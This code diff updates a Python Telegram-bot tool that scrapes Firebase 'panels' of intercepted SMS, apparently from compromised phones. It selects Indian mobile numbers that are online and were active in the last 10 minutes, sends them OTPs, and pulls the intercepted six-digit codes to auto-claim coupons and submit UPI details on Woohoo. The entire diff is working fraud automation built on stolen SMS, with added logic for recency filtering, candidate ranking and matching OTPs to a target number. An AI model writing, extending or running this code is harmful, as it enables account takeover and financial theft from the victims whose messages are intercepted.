@@ -58,6 +58,7 @@ MAX_SEND_RETRIES = 2  # Maximum OTP send attempts per online mobile number
 WAIT_SECONDS = 10  # Wait duration in seconds per OTP check cycle
 SMS_WAIT_TIMEOUT = float(WAIT_SECONDS)
 ONLINE_MAX_AGE_SEC = 1800
+RECENT_OTP_WINDOW_SEC = 600  # Latest OTP/activity must be within last 10 minutes (600s)
 
 OTP_KEYWORDS = ["VM-QWKCLR-S", "otp", "code", "verification", "login"]
 OTP_PATTERNS = [
@@ -842,6 +843,9 @@ def _check_node_online_activity(info: Dict[str, Any]) -> Optional[bool]:
 
 def _is_firebase_node_offline(node: dict) -> bool:
     """Checks whether a Firebase device/session node is marked offline."""
+    if not isinstance(node, dict):
+        return False
+
     status_val = str(
         node.get("status")
         or node.get("state")
@@ -854,10 +858,10 @@ def _is_firebase_node_offline(node: dict) -> bool:
     if "offline" in status_val:
         return True
 
-    for flag_key in ("online", "isOnline", "is_online", "active", "isActive"):
+    for flag_key in ("online", "isOnline", "is_online", "active", "isActive", "status"):
         if flag_key in node:
             val = node[flag_key]
-            if val is False or str(val).strip().lower() in ("false", "0", "no", "offline"):
+            if val is False or str(val).strip().lower() in ("false", "0", "no", "offline", "inactive"):
                 return True
 
     if "offline" in node and node["offline"] is True:
@@ -868,7 +872,7 @@ def _is_firebase_node_offline(node: dict) -> bool:
 
 def _is_firebase_node_online(node: dict) -> bool:
     """Checks whether a Firebase device/session node is explicitly online or recently active."""
-    if _is_firebase_node_offline(node):
+    if not isinstance(node, dict) or _is_firebase_node_offline(node):
         return False
 
     status_val = str(
@@ -880,7 +884,7 @@ def _is_firebase_node_online(node: dict) -> bool:
         or ""
     ).strip().lower()
 
-    if "online" in status_val:
+    if "online" in status_val or status_val in ("true", "1", "yes", "active"):
         return True
 
     for flag_key in ("online", "isOnline", "is_online", "active", "isActive"):
@@ -889,13 +893,54 @@ def _is_firebase_node_online(node: dict) -> bool:
             if val is True or str(val).strip().lower() in ("true", "1", "yes", "online"):
                 return True
 
-    for ts_key in ("lastSeen", "last_seen", "ping", "heartbeat", "updatedAt", "timestamp"):
+    for ts_key in ("lastSeen", "last_seen", "ping", "heartbeat", "updatedAt", "timestamp", "lastPing", "lastupdate"):
         ts = node.get(ts_key)
         if ts is not None:
             parsed_sec = _parse_any_timestamp_to_seconds(ts)
-            if parsed_sec is not None and 0 <= (time.time() - parsed_sec) <= ONLINE_MAX_AGE_SEC:
+            if parsed_sec is not None and 0 <= (time.time() - parsed_sec) <= RECENT_OTP_WINDOW_SEC:
                 return True
 
+    return False
+
+
+def _collect_node_timestamps(node: Any) -> list[float]:
+    """Collects all valid epoch/date timestamps inside a node or subtree."""
+    timestamps: list[float] = []
+    dummy_flags = {"has_online_node": False}
+    _collect_timestamps_and_activity_recursive(node, timestamps, dummy_flags)
+    return timestamps
+
+
+def _has_recent_activity_within_10min(node: Any, max_age_sec: int = RECENT_OTP_WINDOW_SEC) -> bool:
+    """Returns True if the node/subtree has a recent timestamp within the last 10 minutes (600s)."""
+    ts_list = _collect_node_timestamps(node)
+    if not ts_list:
+        return False
+    return (time.time() - max(ts_list)) <= max_age_sec
+
+
+def _node_matches_target_number(node: Any, target_number: str) -> bool:
+    """Checks whether a JSON node/record references the given 10-digit Indian mobile number."""
+    cleaned_target = _clean_ten_digit_indian_number(target_number)
+    if not cleaned_target:
+        return False
+    if isinstance(node, dict):
+        for field in (
+            "number", "phone", "mobNo", "mobile", "phoneNumber",
+            "simNumber", "sim1", "sim_number", "address", "to",
+            "destination", "cleanNumber", "cleanPhone", "rawNumber", "num",
+        ):
+            if field in node and _clean_ten_digit_indian_number(node[field]) == cleaned_target:
+                return True
+        for v in node.values():
+            if isinstance(v, (dict, list)) and _node_matches_target_number(v, cleaned_target):
+                return True
+            elif isinstance(v, str) and cleaned_target in re.sub(r"\D", "", v):
+                return True
+    elif isinstance(node, list):
+        return any(_node_matches_target_number(item, cleaned_target) for item in node)
+    elif isinstance(node, str):
+        return cleaned_target in re.sub(r"\D", "", node)
     return False
 
 
@@ -942,7 +987,7 @@ async def is_firebase_active(fb_url: str, timeout: int = 8) -> Dict[str, Any]:
             all_ts: list[float] = []
             flags = {"has_online_node": False}
             _collect_timestamps_and_activity_recursive(data, all_ts, flags)
-            if all_ts and (time.time() - max(all_ts)) <= 600:
+            if all_ts and (time.time() - max(all_ts)) <= RECENT_OTP_WINDOW_SEC:
                 return {"active": True, "reason": "recent_sms_activity", "online_count": 1}
 
             return {"active": False, "reason": "no_online_sources", "online_count": 0}
@@ -1001,7 +1046,7 @@ def _evaluate_firebase_payload(data: Any) -> str:
     if all_timestamps:
         latest_ts_sec = max(all_timestamps)
         time_diff = time.time() - latest_ts_sec
-        if time_diff <= 600:
+        if time_diff <= RECENT_OTP_WINDOW_SEC:
             secs = max(0, int(time_diff))
             return f"Active (Last SMS/activity {secs}s ago)"
         else:
@@ -1198,11 +1243,17 @@ def is_valid_upi_format(upi_id: str) -> bool:
     return bool(re.match(upi_pattern, upi_id))
 
 
-def _extract_online_numbers_from_tree(obj, inherited_offline: bool = False, inherited_online: bool = False) -> list[str]:
+def _extract_online_numbers_from_tree(
+    obj,
+    inherited_offline: bool = False,
+    inherited_online: bool = False,
+    require_recent_10min: bool = True,
+) -> list[str]:
     """
     Scans a Firebase JSON tree:
     - Skips any 'offline' session/branch completely.
-    - Extracts 10-digit Indian mobile numbers exclusively from 'online' sessions/devices.
+    - Extracts 10-digit Indian mobile numbers exclusively from 'online' sessions/devices
+      that have recent activity within 10 minutes (when require_recent_10min=True).
     """
     number_pattern = r'(?<!\d)(?:\+91[\-\s]?|91[\-\s]?|0)?([6-9]\d{9})(?!\d)'
     results = []
@@ -1212,6 +1263,7 @@ def _extract_online_numbers_from_tree(obj, inherited_offline: bool = False, inhe
             return []
 
         node_online = inherited_online or _is_firebase_node_online(obj)
+        node_recent = _has_recent_activity_within_10min(obj, RECENT_OTP_WINDOW_SEC)
 
         for key, val in obj.items():
             key_lower = str(key).lower()
@@ -1221,8 +1273,9 @@ def _extract_online_numbers_from_tree(obj, inherited_offline: bool = False, inhe
                 continue
 
             branch_online = node_online or ("online" in key_lower)
+            branch_recent = node_recent or _has_recent_activity_within_10min(val, RECENT_OTP_WINDOW_SEC)
 
-            if branch_online:
+            if branch_online and (not require_recent_10min or branch_recent):
                 for n in re.findall(number_pattern, str(key)):
                     if n not in results:
                         results.append(n)
@@ -1232,11 +1285,12 @@ def _extract_online_numbers_from_tree(obj, inherited_offline: bool = False, inhe
                     val,
                     inherited_offline=False,
                     inherited_online=branch_online,
+                    require_recent_10min=require_recent_10min,
                 )
                 for n in sub_nums:
                     if n not in results:
                         results.append(n)
-            elif branch_online and val is not None:
+            elif branch_online and (not require_recent_10min or branch_recent) and val is not None:
                 for n in re.findall(number_pattern, str(val)):
                     if n not in results:
                         results.append(n)
@@ -1247,6 +1301,7 @@ def _extract_online_numbers_from_tree(obj, inherited_offline: bool = False, inhe
                 item,
                 inherited_offline=inherited_offline,
                 inherited_online=inherited_online,
+                require_recent_10min=require_recent_10min,
             )
             for n in sub_nums:
                 if n not in results:
@@ -1300,10 +1355,85 @@ def _extract_number_from_node_or_key(key: Any, info: Any) -> Optional[str]:
     return _clean_ten_digit_indian_number(key)
 
 
+def _rank_candidates_by_recent_otp(candidates: list[dict], root_data: Any) -> list[dict]:
+    """
+    Prioritizes online numbers that have recent SMS/OTP activity within the last 10 minutes (600s)
+    and whose latest OTP timestamp is freshest.
+    """
+    now_sec = time.time()
+
+    def _score(item: dict) -> tuple[int, float]:
+        phone = item["number"]
+        best_ts: Optional[float] = None
+        if isinstance(root_data, dict):
+            for section in ("sms", "Sms", "messages", "inbox", "user_sms", "All_User", "All_Users", "clients", "numbers", "devices"):
+                sec_val = root_data.get(section)
+                if isinstance(sec_val, (dict, list)):
+                    for sub_ts in _collect_node_timestamps(sec_val):
+                        if (now_sec - sub_ts) <= RECENT_OTP_WINDOW_SEC:
+                            if best_ts is None or sub_ts > best_ts:
+                                best_ts = sub_ts
+                    # Check matching number sub-records specifically
+                    stack = [sec_val]
+                    while stack:
+                        cur = stack.pop()
+                        if isinstance(cur, dict):
+                            if _node_matches_target_number(cur, phone):
+                                for t in _collect_node_timestamps(cur):
+                                    if (now_sec - t) <= RECENT_OTP_WINDOW_SEC:
+                                        if best_ts is None or t > best_ts:
+                                            best_ts = t
+                            for v in cur.values():
+                                if isinstance(v, (dict, list)):
+                                    stack.append(v)
+                        elif isinstance(cur, list):
+                            for v in cur:
+                                if isinstance(v, (dict, list)):
+                                    stack.append(v)
+        if best_ts is not None:
+            return (1, best_ts)
+        return (0, 0.0)
+
+    ranked = sorted(candidates, key=_score, reverse=True)
+    recent_only = [c for c in ranked if _score(c)[0] == 1]
+    return recent_only if recent_only else ranked
+
+
 def get_online_numbers(firebase_url: str) -> list[dict]:
-    """Fetches numbers with 'online' status from Firebase /numbers.json, /clients.json, or root/devices."""
+    """
+    Fetches online numbers from Firebase root /.json and node paths, filtering for
+    online/active devices with recent activity within the last 10 minutes (600s).
+    """
     root_url, query = _get_firebase_root_and_query(firebase_url)
     q_suffix = f"?{query}" if query else ""
+    root_target = f"{root_url}/.json{q_suffix}"
+    root_data: Any = None
+
+    try:
+        root_res = requests.get(root_target, timeout=6)
+        if root_res.status_code == 200:
+            root_data = root_res.json()
+    except Exception:
+        root_data = None
+
+    if isinstance(root_data, dict) and root_data:
+        online_list: list[dict] = []
+        for section in ("clients", "numbers", "devices", "users", "all_user", "all_users"):
+            sec = root_data.get(section)
+            if isinstance(sec, dict):
+                for key, info in sec.items():
+                    if isinstance(info, dict) and _is_firebase_node_online(info):
+                        if not _has_recent_activity_within_10min(info, RECENT_OTP_WINDOW_SEC):
+                            continue
+                        cleaned = _extract_number_from_node_or_key(key, info)
+                        if cleaned and not any(x["number"] == cleaned for x in online_list):
+                            online_list.append({"id": str(key), "number": cleaned})
+        if not online_list:
+            for num in _extract_online_numbers_from_tree(root_data, require_recent_10min=True):
+                if not any(x["number"] == num for x in online_list):
+                    online_list.append({"id": None, "number": num})
+        if online_list:
+            return _rank_candidates_by_recent_otp(online_list, root_data)
 
     for node in ("numbers.json", "clients.json", "devices.json", "users.json"):
         target = f"{root_url}/{node}{q_suffix}"
@@ -1315,42 +1445,21 @@ def get_online_numbers(firebase_url: str) -> list[dict]:
                 if isinstance(data, dict):
                     for key, info in data.items():
                         if isinstance(info, dict) and _is_firebase_node_online(info):
+                            if not _has_recent_activity_within_10min(info, RECENT_OTP_WINDOW_SEC):
+                                continue
                             cleaned = _extract_number_from_node_or_key(key, info)
                             if cleaned and not any(x["number"] == cleaned for x in online_list):
                                 online_list.append({"id": str(key), "number": cleaned})
                 if online_list:
-                    return online_list
+                    return _rank_candidates_by_recent_otp(online_list, root_data or data)
         except Exception as e:
             print(f"  [Error] Failed to fetch online numbers from Firebase ({target}): {e}")
-
-    root_target = _build_firebase_query_url(firebase_url, "")
-    try:
-        res = requests.get(root_target, timeout=6)
-        if res.status_code == 200 and res.json():
-            data = res.json()
-            online_list = []
-            if isinstance(data, dict):
-                for section in ("clients", "numbers", "devices", "users", "all_user", "all_users"):
-                    sec = data.get(section)
-                    if isinstance(sec, dict):
-                        for key, info in sec.items():
-                            if isinstance(info, dict) and _is_firebase_node_online(info):
-                                cleaned = _extract_number_from_node_or_key(key, info)
-                                if cleaned and not any(x["number"] == cleaned for x in online_list):
-                                    online_list.append({"id": str(key), "number": cleaned})
-                if not online_list:
-                    for num in _extract_online_numbers_from_tree(data):
-                        if not any(x["number"] == num for x in online_list):
-                            online_list.append({"id": None, "number": num})
-            return online_list
-    except Exception:
-        pass
 
     return []
 
 
-def _panel_has_recent_sms_or_activity(firebase_url: str, max_age_sec: int = 600) -> bool:
-    """Checks whether a Firebase panel has any SMS or activity within max_age_sec (default 10 min)."""
+def _panel_has_recent_sms_or_activity(firebase_url: str, max_age_sec: int = RECENT_OTP_WINDOW_SEC) -> bool:
+    """Checks whether a Firebase panel has any SMS or activity within max_age_sec (default 10 min / 600s)."""
     target_url = _build_firebase_query_url(firebase_url, "")
     try:
         res = requests.get(target_url, timeout=5)
@@ -1360,8 +1469,6 @@ def _panel_has_recent_sms_or_activity(firebase_url: str, max_age_sec: int = 600)
             flags = {"has_online_node": False}
             _collect_timestamps_and_activity_recursive(data, timestamps, flags)
             if timestamps and (time.time() - max(timestamps)) <= max_age_sec:
-                return True
-            if flags["has_online_node"]:
                 return True
     except Exception:
         pass
@@ -1392,6 +1499,7 @@ def check_otp_in_firebase(firebase_url: str, number_id: str) -> Optional[str]:
         f"{root_url}/clients/{number_id}/otp.json{q_suffix}",
         f"{root_url}/numbers/{number_id}.json{q_suffix}",
         f"{root_url}/clients/{number_id}.json{q_suffix}",
+        f"{root_url}/.json{q_suffix}",
     ]
     for _ in range(WAIT_SECONDS):
         for target in targets:
@@ -1401,6 +1509,9 @@ def check_otp_in_firebase(firebase_url: str, number_id: str) -> Optional[str]:
                     val = res.json()
                     if isinstance(val, dict) and "otp" in val:
                         val = val["otp"]
+                    candidates = _extract_otp_candidates_from_any(val, floor_ms=int((time.time() - RECENT_OTP_WINDOW_SEC) * 1000))
+                    if candidates:
+                        return candidates[0]
                     matched = re.search(r'(?<!\d)(\d{6})(?!\d)', str(val).strip())
                     if matched:
                         return matched.group(1)
@@ -1482,7 +1593,7 @@ def process_all_panels(
 
 
 def _fetch_numbers_from_single_firebase_sync(firebase_url: str) -> list[str]:
-    """Checks the single Firebase URL once and extracts 10-digit Indian mobile numbers exclusively from explicitly Online sessions."""
+    """Checks the single Firebase URL once and extracts 10-digit Indian mobile numbers exclusively from explicitly Online sessions with recent 10-min activity."""
     target_url = _build_firebase_query_url(firebase_url, "")
     found_numbers = []
 
@@ -1490,7 +1601,12 @@ def _fetch_numbers_from_single_firebase_sync(firebase_url: str) -> list[str]:
         resp = requests.get(target_url, timeout=6)
         if resp.status_code == 200 and resp.json():
             data = resp.json()
-            online_nums = _extract_online_numbers_from_tree(data, inherited_offline=False, inherited_online=False)
+            online_nums = _extract_online_numbers_from_tree(
+                data,
+                inherited_offline=False,
+                inherited_online=False,
+                require_recent_10min=True,
+            )
             for num in online_nums:
                 if num not in found_numbers:
                     found_numbers.append(num)
@@ -1511,7 +1627,7 @@ def _record_used_item_bounded(lst: list[str], item: str, max_len: int = 500) -> 
 async def fetch_random_active_number_from_panels(context: ContextTypes.DEFAULT_TYPE) -> Optional[dict]:
     """
     Fetches an active online number from saved Firebase Panels in order
-    (via /numbers.json or /clients.json first, falling back to single-URL tree scanning).
+    (via /.json and node paths first, filtering for recent 10-min OTP/activity).
     """
     ordered_endpoints = _get_ordered_saved_firebase_endpoints(context)
     if not ordered_endpoints:
@@ -1566,57 +1682,79 @@ async def _http_raw(method: str, url: str, timeout: float = 5) -> tuple[int, Opt
     return await asyncio.to_thread(_http_raw_sync, method, url, timeout)
 
 
-def _extract_otp_candidates_from_any(obj: Any, floor_ms: int = 0) -> list[str]:
-    """Extracts 6-digit OTPs from dicts/lists/strings, prioritizing OTP/SMS-like fields."""
-    found: list[str] = []
+def _extract_otp_candidates_from_any(obj: Any, floor_ms: int = 0, target_number: Optional[str] = None) -> list[str]:
+    """
+    Extracts 6-digit OTPs from dicts/lists/strings, prioritizing OTP/SMS-like fields,
+    recent timestamps (within floor_ms), and matching target_number when present.
+    """
+    prioritized: list[str] = []
+    fallback_codes: list[str] = []
     text_fields = (
         "body", "message", "text", "sms", "msg", "content",
         "message_body", "Message", "Body", "Text", "SMS", "otp", "OTP", "code",
     )
 
-    def _add_otp(raw_val: Any) -> None:
+    def _add_otp(raw_val: Any, is_priority: bool = False) -> None:
         if raw_val is None or isinstance(raw_val, bool):
             return
         s = str(raw_val).strip()
         if not s:
             return
+        bucket = prioritized if is_priority else fallback_codes
         for pat in OTP_PATTERNS:
             for m in pat.finditer(s):
                 code = re.sub(r"\D", "", m.group(1) if m.groups() else m.group(0))
-                if len(code) == 6 and code not in found:
-                    found.append(code)
+                if len(code) == 6 and code not in bucket:
+                    bucket.append(code)
 
-    def _walk(node: Any, key_hint: str = "") -> None:
+    def _walk(node: Any, key_hint: str = "", parent_matches_num: bool = False) -> None:
         if isinstance(node, dict):
+            node_ts_list = _collect_node_timestamps(node)
+            if floor_ms > 0 and node_ts_list:
+                latest_node_ms = int(max(node_ts_list) * 1000)
+                if latest_node_ms < floor_ms:
+                    return
+
+            matched_here = parent_matches_num or (
+                bool(target_number) and _node_matches_target_number(node, target_number or "")
+            )
+
             if "otp" in node and node["otp"] is not None:
-                _add_otp(node["otp"])
+                _add_otp(node["otp"], is_priority=True)
+
             for k, v in node.items():
                 k_str = str(k)
                 k_low = k_str.lower()
                 if floor_ms > 0 and k_str.isdigit():
                     try:
                         ts_val = int(k_str)
-                        if ts_val > 1e11 and ts_val < floor_ms - 10000:
+                        if ts_val > 1e11 and ts_val < floor_ms:
                             continue
                     except ValueError:
                         pass
                 if isinstance(v, (dict, list)):
-                    _walk(v, k_low)
+                    _walk(v, k_low, parent_matches_num=matched_here)
                 elif k_low in text_fields or any(kw in k_low for kw in ("otp", "sms", "msg", "body", "text", "code")):
-                    _add_otp(v)
-                elif isinstance(v, str) and any(kw in v.lower() for kw in OTP_KEYWORDS):
-                    _add_otp(v)
+                    _add_otp(v, is_priority=True)
+                elif isinstance(v, str) and any(kw.lower() in v.lower() for kw in OTP_KEYWORDS):
+                    _add_otp(v, is_priority=True)
+                elif matched_here and isinstance(v, (str, int)):
+                    _add_otp(v, is_priority=False)
         elif isinstance(node, list):
             for item in node:
-                _walk(item, key_hint)
+                _walk(item, key_hint, parent_matches_num=parent_matches_num)
         elif isinstance(node, str):
             if any(kw in key_hint for kw in ("otp", "sms", "msg", "body", "text", "code")) or any(
-                kw in node.lower() for kw in OTP_KEYWORDS
+                kw.lower() in node.lower() for kw in OTP_KEYWORDS
             ):
-                _add_otp(node)
+                _add_otp(node, is_priority=True)
 
     _walk(obj)
-    return found
+    combined = list(prioritized)
+    for c in fallback_codes:
+        if c not in combined:
+            combined.append(c)
+    return combined
 
 
 async def fetch_otp_from_firebase(
@@ -1625,16 +1763,19 @@ async def fetch_otp_from_firebase(
     trigger_ms: int,
     timeout: float = SMS_WAIT_TIMEOUT,
     exclude: Optional[set] = None,
+    target_number: Optional[str] = None,
 ) -> Optional[str]:
     exclude = exclude or set()
     start = time.time()
-    floor = int(trigger_ms) - 10000
+    recent_cutoff_ms = int((time.time() - RECENT_OTP_WINDOW_SEC) * 1000)
+    floor = max(int(trigger_ms) - 10000, recent_cutoff_ms)
     root_url, query = _get_firebase_root_and_query(fb_url)
     base = root_url.rstrip("/")
     q_suffix = f"?{query}" if query else ""
     cid = str(client_id or "").strip()
 
     raw_paths = [
+        _build_firebase_query_url(fb_url, ""),
         f"{base}/messages/{cid}.json",
         f"{base}/All_User/Sms/{cid}.json",
         f"{base}/All_Users/Sms/{cid}.json",
@@ -1649,15 +1790,14 @@ async def fetch_otp_from_firebase(
         f"{base}/user_sms.json",
         f"{base}/sms.json",
         f"{base}/Sms.json",
-        _build_firebase_query_url(fb_url, ""),
     ] if cid else [
+        _build_firebase_query_url(fb_url, ""),
         f"{base}/messages.json",
         f"{base}/All_User/Sms.json",
         f"{base}/All_Users/Sms.json",
         f"{base}/user_sms.json",
         f"{base}/sms.json",
         f"{base}/Sms.json",
-        _build_firebase_query_url(fb_url, ""),
     ]
     paths = list(dict.fromkeys(p + q_suffix for p in raw_paths))
 
@@ -1666,7 +1806,7 @@ async def fetch_otp_from_firebase(
             status, data = await _http_raw("GET", url, timeout=4.5)
             if status != 200 or not data:
                 continue
-            candidates = _extract_otp_candidates_from_any(data, floor_ms=floor)
+            candidates = _extract_otp_candidates_from_any(data, floor_ms=floor, target_number=target_number)
             for otp in candidates:
                 if len(otp) == 6 and otp.isdigit() and otp not in exclude:
                     return otp
@@ -1677,12 +1817,12 @@ async def fetch_otp_from_firebase(
 def _poll_otp_for_number_sync(firebase_url: str, number: str, number_id: Optional[str], baseline_otps: list[str]) -> Optional[str]:
     """
     Polls Firebase every 1 second for up to WAIT_SECONDS (10s)
-    for a new 6-digit OTP associated with the target number or panel.
+    for a new 6-digit OTP associated with the target number or panel within the last 10 minutes.
     """
     root_url, query = _get_firebase_root_and_query(firebase_url)
     q_suffix = f"?{query}" if query else ""
     base = root_url.rstrip("/")
-    target_urls = []
+    target_urls = [_build_firebase_query_url(firebase_url, "")]
     if number_id:
         for p in (
             f"{base}/numbers/{number_id}/otp.json",
@@ -1695,9 +1835,9 @@ def _poll_otp_for_number_sync(firebase_url: str, number: str, number_id: Optiona
             f"{base}/All_User/Sms/{number_id}.json",
         ):
             target_urls.append(p + q_suffix)
-    target_urls.append(_build_firebase_query_url(firebase_url, ""))
     target_urls = list(dict.fromkeys(target_urls))
     excluded_set = set(baseline_otps)
+    floor_ms = int((time.time() - RECENT_OTP_WINDOW_SEC) * 1000)
 
     for _ in range(WAIT_SECONDS):
         for target_url in target_urls:
@@ -1705,7 +1845,7 @@ def _poll_otp_for_number_sync(firebase_url: str, number: str, number_id: Optiona
                 res = requests.get(target_url, timeout=4.5)
                 if res.status_code == 200 and res.json() is not None:
                     payload_val = res.json()
-                    for otp in _extract_otp_candidates_from_any(payload_val, floor_ms=0):
+                    for otp in _extract_otp_candidates_from_any(payload_val, floor_ms=floor_ms, target_number=number):
                         if len(otp) == 6 and otp.isdigit() and otp not in excluded_set:
                             return otp
             except Exception:
@@ -1834,7 +1974,7 @@ async def auto_claim_triplet_on_woohoo(
     """
     Executes the full automated claim workflow for an Online Number + Coupon + UPI triplet:
     1. Creates the session first and logs live session/error status.
-    2. Checks saved Firebase panels in order and fetches online numbers.
+    2. Checks saved Firebase panels in order and fetches online numbers with recent 10-min OTP/activity.
     3. Dispatches OTP to an online number and polls/fetches OTP; if none arrives, checks the next online number in that panel.
     4. Once all numbers in the current panel are exhausted, switches to the next saved Firebase panel in order.
     5. Automatically completes Step 2 (OTP Verification) and Step 3 (UPI Submission).
@@ -1908,7 +2048,7 @@ async def auto_claim_triplet_on_woohoo(
     for panel_idx, fb_url in enumerate(ordered_endpoints, 1):
         await _notify_progress(f"Panel {panel_idx}/{len(ordered_endpoints)}: Checking {fb_url}...")
 
-        has_recent = await asyncio.to_thread(_panel_has_recent_sms_or_activity, fb_url, 600)
+        has_recent = await asyncio.to_thread(_panel_has_recent_sms_or_activity, fb_url, RECENT_OTP_WINDOW_SEC)
         structured_online = await asyncio.to_thread(get_online_numbers, fb_url)
 
         candidates = []
@@ -1922,9 +2062,9 @@ async def auto_claim_triplet_on_woohoo(
 
         if not candidates:
             if not has_recent:
-                _mark_panel_status_in_session(context, fb_url, False, "No online numbers / recent SMS")
-            failed_logs.append(f"⚠️ Panel {panel_idx} — No online numbers, switching to next panel...")
-            await _notify_progress(f"Panel {panel_idx} — No online numbers, switching to next panel...")
+                _mark_panel_status_in_session(context, fb_url, False, "No online numbers / recent SMS (<10m)")
+            failed_logs.append(f"⚠️ Panel {panel_idx} — No active online numbers with recent OTP, switching to next panel...")
+            await _notify_progress(f"Panel {panel_idx} — No active online numbers, switching to next panel...")
             continue
 
         _mark_panel_status_in_session(context, fb_url, True, f"{len(candidates)} online numbers")
@@ -2053,6 +2193,7 @@ async def auto_claim_triplet_on_woohoo(
                         trigger_ms=trigger_ms,
                         timeout=SMS_WAIT_TIMEOUT,
                         exclude=set(baseline_otps),
+                        target_number=phone,
                     )
                     if not received_otp:
                         received_otp = await asyncio.to_thread(
